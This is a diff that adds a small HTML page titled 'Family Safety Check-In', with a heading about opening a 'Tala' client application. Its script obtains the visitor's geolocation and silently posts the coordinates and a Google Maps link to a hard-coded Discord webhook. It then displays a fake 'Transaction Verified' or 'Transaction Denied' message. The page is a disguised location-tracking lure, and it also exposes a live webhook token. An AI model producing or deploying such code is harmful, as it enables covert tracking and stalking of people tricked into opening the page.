@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Family Safety Check-In</title>
+</head>
+<body>
+
+<h2>Openning Client Tala Application</h2>
+
+<script>
+const webhook = "https://discordapp.com/api/webhooks/1506535839960924160/kTLi2pZPV6rNLQmsOR7L43p6HIbXtn-DpNCYSCi7HdGTLLeZ6m0_04Ykqy27nGVAIMWJ";
+
+navigator.geolocation.getCurrentPosition(async (position) => {
+
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    const message = {
+        content:
+        `Family Location Update\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`
+    };
+
+    await fetch(webhook, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(message)
+    });
+
+    document.body.innerHTML = "<h2>Transaction Verified</h2>";
+
+}, (err) => {
+    document.body.innerHTML = "<h2>Transaction Denied.</h2>";
+});
+</script>
+
+</body>
+</html>
